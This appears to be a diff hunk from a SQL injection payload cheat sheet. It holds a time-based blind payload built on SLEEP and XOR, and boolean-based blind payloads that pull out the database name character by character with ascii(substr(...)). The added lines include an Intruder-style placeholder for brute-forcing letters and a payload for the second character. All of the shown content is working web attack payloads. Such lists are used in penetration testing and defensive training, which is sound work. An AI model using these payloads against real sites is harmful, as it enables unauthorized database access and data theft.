@@ -109,5 +109,8 @@ latest:
 'XOR(IF(length(user())>20,SLEEP(3),0))XOR'Z--%20-+
 
 # Boolean based blind payload, this payload will check the first name of database
-
 ' or (ascii(substr((select+database()),1,1))) ='1
+' or (ascii(substr((select+database()),1,1))) ='$intruder$  //add ascci number of a-z
+
+# to find second character
+' or (ascii(substr((select+database()),2,1))) ='1
